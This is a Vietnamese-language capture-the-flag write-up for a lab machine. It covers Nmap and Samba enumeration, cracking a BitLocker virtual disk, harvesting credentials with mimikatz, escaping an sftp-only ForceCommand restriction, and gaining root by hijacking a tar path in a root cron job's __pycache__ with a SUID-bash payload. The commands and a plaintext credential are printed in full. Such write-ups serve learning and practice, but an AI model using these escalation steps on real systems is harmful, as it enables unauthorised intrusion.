![[Pasted image 20261031112055.png]]



# Véc tơ tấn công

svc_backup: Nmap -> vm_ware enumeration -> credentials -> sftp files upload -> ssh

root: system enumeration -> cronjob -> app.py running helper.py -> helper.py runs __pycache__ -> change binary directory and write exploit binary -> root. 



# Enumeration with Nmap

```
# Nmap 7.95 scan initiated Fri Oct 30 14:27:54 2026 as: nmap -sC -sV -oN odori.nmap 10.129.63.193
Nmap scan report for 10.129.63.193
Host is up (0.067s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 33:6a:5a:1f:35:95:4f:47:78:f4:5e:81:1b:ac:0e:af (ECDSA)
|_  256 62:a0:e7:ec:de:21:8d:83:cd:72:cc:7b:fa:9f:7f:15 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-10-30T07:27:01
|_  start_date: N/A
|_nbstat: NetBIOS name: ODORI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1m18s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 30 14:28:21 2026 -- 1 IP address (1 host up) scanned in 26.84 seconds
```


- Nhận xét về host:
	- cổng 22 đang mở ssh chưa làm gì được
	- cổng 139 và 445 -> Samba đang mở

các shares
![[Pasted image 20261030143532.png]]

bạn có thể thấy rằng share backup có quyền read

![[Pasted image 20261030143733.png]]
đọc file backup bạn thấy nói về vmdk

mount cái bài trên ta được 1 máy ảo vmdk => mount nó về máy thì thấy bitlocker encrypted thôi thì dùng bitlocker2john và john decrypt ta được mật khẩu 123456789


khi ở trong máy ảo, ta thực hiện vài script như mimikatz.exe, pypykatz...

# shell as svc_backup

Khi enumerate mount đó ta được credentials: svc_backup:Napping2Curator => sử dụng mimikatz.exe 

nhưng mà chỉ vào được sftp

config trong ssh cho ta thấy  /opt/restrict sẽ thực hiện nếu ta vào ssh
```bash

cat sshd_config Match group svc_backup 
#ChrootDirectory /backup 
ForceCommand /opt/restrict /home/%u 
AllowTcpForwarding no
```

vậy thì chúng ta chỉ cần modify cái /opt/restrict là vào được

```bash
cat restrict 
#!/bin/bash 
/usr/lib/openssh/sftp-server -d $1
bash
```

đăng lại lên bằng sftp và ta vào được shell
![[Pasted image 20261030171813.png]]


# shell as root

 trong quá trình enumerate hệ thống tôi thấy 1 tiến trình chạy ngầm root rằng
```
python3 /opt/archiver/app.py
```


app.py
![[Pasted image 20261030172005.png]]

ta thấy cái tiến trình này scan và xóa hết mọi thứ trong folder /backup khi nó đã quá 3 năm tuổi

ta thấy nó đang chạy helper.py
![[Pasted image 20261030172036.png]]
ta thấy helper.py nữa
thì có cái dòng subprocess khá là sus có vẻ như là sẽ đóng gói các cái dữ liệu vào file tar và xóa đi

và pycache
![[Pasted image 20261030172250.png]]

![[Pasted image 20261030172439.png]]

=> có helper....



Nhận xét thật sự: 
- app.py đang được thực thi bởi root thông qua 1 tiến trình ẩn
- app.py gọi thư viện tại helper.py
- helper.py có lưu file __pycache__ 
=> thay đổi đường dẫn tar trên file pycache và tiêm lệnh độc vào và trigger app.py thì ta sẽ được quyền root
bạn thay đổi đường dẫn /usr/bin/tar thành /tmp/bin/tar và ghi mã độc lên file /tmp/bin/tar
rồi sau đó tạo file giả có thời gian > 3 năm trên /backup

```bash
sed -i 's|/usr/bin/tar|/tmp/bin/tar|'
mkdir -p /tmp/bin/
echo "cp /bin/bash /tmp/pwn; chmod u+s /tmp/pwn" >> /tmp/bin/tar && chmod 777 /tmp/bin/tar

# trigger lỗ hổng
touch -d '2015-08-09 13:38:36.000000000 +0000' /backup/ancient
```

![[Pasted image 20261030174351.png]]

có rồi đợi mãi =))


![[Pasted image 20261030174435.png]]